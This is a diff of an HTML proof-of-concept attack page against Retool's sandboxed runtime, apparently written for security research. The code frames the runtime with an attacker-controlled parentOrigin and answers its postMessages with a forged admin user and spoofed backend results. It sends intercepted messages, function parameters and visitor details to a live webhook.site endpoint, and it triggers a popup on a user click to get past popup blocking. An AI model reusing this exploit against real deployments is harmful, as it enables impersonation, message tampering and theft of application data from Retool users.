@@ -22,16 +22,15 @@
   <p id="sub">Please wait</p>
 </div>
 
-<iframe id="f" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
+<iframe id="f1" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
+<iframe id="f2" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
 
 <script>
 (function() {
   'use strict';
 
   var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
-  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
-  var POPUP = null;
-  var F = document.getElementById('f');
+  var ATK_ORIGIN = location.origin;
   var cntI = 0, cntJ = 0;
 
   function X(payload) {
@@ -41,9 +40,6 @@
     new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
   }
 
-  function log(msg) { console.log('[PoC]', msg); }
-
-  // Fake admin user
   var FAKE = {
     id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
     fullName: 'Hacked Admin', profilePhotoUrl: null,
@@ -52,7 +48,10 @@
     sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
   };
 
-  // Inject into target window
+  // THE REAL SANDBOX URL — retool-edge.com runtime
+  var RUNTIME_BASE = 'https://retool-edge.com/runtime.M2M3OWU5.html';
+  var RUNTIME_URL = RUNTIME_BASE + '?parentOrigin=' + encodeURIComponent(ATK_ORIGIN) + '&product=retool-web&isTestRuntime=false';
+
   function inject(win) {
     if (!win || win.closed) return;
     try {
@@ -60,78 +59,82 @@
       win.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
       cntJ++;
     } catch(e) {}
-    log('Injected #' + cntJ);
   }
 
-  // Listen for sandbox messages
+  // Intercept postMessages from runtime
   window.addEventListener('message', function(e) {
     var d = e.data;
     if (!d || typeof d !== 'object' || !d.type) return;
 
-    var fromFrame = F.contentWindow && e.source === F.contentWindow;
-    var fromPopup = POPUP && e.source === POPUP;
-    if (!fromFrame && !fromPopup) return;
+    var F1 = document.getElementById('f1');
+    var F2 = document.getElementById('f2');
+    var tgt = null;
+    if (F1.contentWindow && e.source === F1.contentWindow) tgt = F1.contentWindow;
+    if (F2.contentWindow && e.source === F2.contentWindow) tgt = F2.contentWindow;
+
+    if (!tgt) return;
 
     cntI++;
-    var tgt = fromFrame ? F.contentWindow : POPUP;
 
     if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
-      log('INTERCEPT: RETOOL_CURRENT_USER_REQUEST from ' + e.origin);
       X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, cnt: cntI, time: new Date().toISOString() });
-      setTimeout(function(){ inject(tgt); }, 100);
+      inject(tgt);
     }
     else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
-      log('INTERCEPT: RETOOL_BACKEND_FUNCTION — ' + d.functionName);
       X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
-      setTimeout(function(){
-        try { tgt.postMessage({ type: 'RETOOL_BACKEND_RESULT', requestId: d.requestId, data: { _spoofed: true, timestamp: new Date().toISOString() } }, '*'); } catch(e) {}
-      }, 100);
+      try {
+        tgt.postMessage({ type: 'RETOOL_BACKEND_RESULT', requestId: d.requestId, data: { _spoofed: true, _attacker: 'origin bypass via parentOrigin param', timestamp: new Date().toISOString() } }, '*');
+      } catch(e) {}
     }
     else if (d.type && d.type.indexOf('RETOOL_') === 0) {
-      log('INTERCEPT: ' + d.type);
       X({ event: 'intercept', type: d.type, origin: e.origin, data: d, time: new Date().toISOString() });
     }
   });
 
-  // Try to attack via iframe
-  function tryIframe(url) {
-    F.src = url;
-    F.onload = function() {
-      log('Iframe loaded: ' + url);
-      inject(F.contentWindow);
-      setInterval(function(){ inject(F.contentWindow); }, 3000);
+  // Load runtime in iframe
+  function loadRuntime(url) {
+    var f = document.createElement('iframe');
+    f.style.display = 'none';
+    f.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation';
+    f.src = url;
+    document.body.appendChild(f);
+
+    f.onload = function() {
+      X({ event: 'runtime_loaded', url: url, time: new Date().toISOString() });
+      document.getElementById('msg').textContent = 'Runtime loaded';
+      document.getElementById('sub').textContent = 'Intercepting...';
+      inject(f.contentWindow);
+      setInterval(function(){ inject(f.contentWindow); }, 3000);
     };
-    F.onerror = function() { log('Iframe blocked: ' + url); };
+
+    f.onerror = function() {
+      X({ event: 'runtime_blocked', url: url, time: new Date().toISOString() });
+      document.getElementById('msg').textContent = 'Connection blocked';
+      document.getElementById('sub').textContent = 'X-Frame-Options prevented loading';
+      document.getElementById('spin').style.display = 'none';
+    };
+
+    return f;
   }
 
-  // Try to attack via popup
-  function tryPopup(url) {
-    var w = 800, h = 600;
-    POPUP = window.open(url, 'r', 'width='+w+',height='+h+',left='+((screen.width-w)/2)+',top='+((screen.height-h)/2));
-    if (!POPUP) { log('Popup blocked'); return; }
-    setTimeout(function(){ inject(POPUP); }, 2000);
-    setInterval(function(){ inject(POPUP); }, 3000);
-  }
-
-  // Auto-start after user clicks (bypass popup blocker)
+  // Auto-start on click
   document.body.addEventListener('click', function go() {
     document.body.removeEventListener('click', go);
 
-    var HOST = 'https://jonjos11.retool.com';
+    X({ event: 'attack_start', url: RUNTIME_URL, attackerOrigin: ATK_ORIGIN, time: new Date().toISOString() });
 
-    // Try the main app URL (this will open the editor which loads the sandbox inside)
-    tryPopup(HOST + '/apps/' + APP_ID + '/editor');
+    // Load runtime with OUR origin as parentOrigin
+    loadRuntime(RUNTIME_URL);
 
-    // Also try to iframe the sandbox URL patterns
-    tryIframe(HOST + '/sandbox/' + APP_ID + '/agent-vite?retool-parent-origin=' + encodeURIComponent(location.origin));
-
-    document.getElementById('msg').textContent = 'Connecting to Retool...';
-    document.getElementById('sub').textContent = 'Check your retool window';
+    // Also open as popup as fallback
+    var popup = window.open(RUNTIME_URL, 'r', 'width=800,height=600,left='+((screen.width-800)/2)+',top='+((screen.height-600)/2));
+    if (popup) {
+      setTimeout(function(){ inject(popup); }, 2000);
+      setInterval(function(){ inject(popup); }, 3000);
+    }
   });
 
-  // Exfil env on load
   X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });
-  log('Ready — click anywhere to start');
 
 })();
 </script>
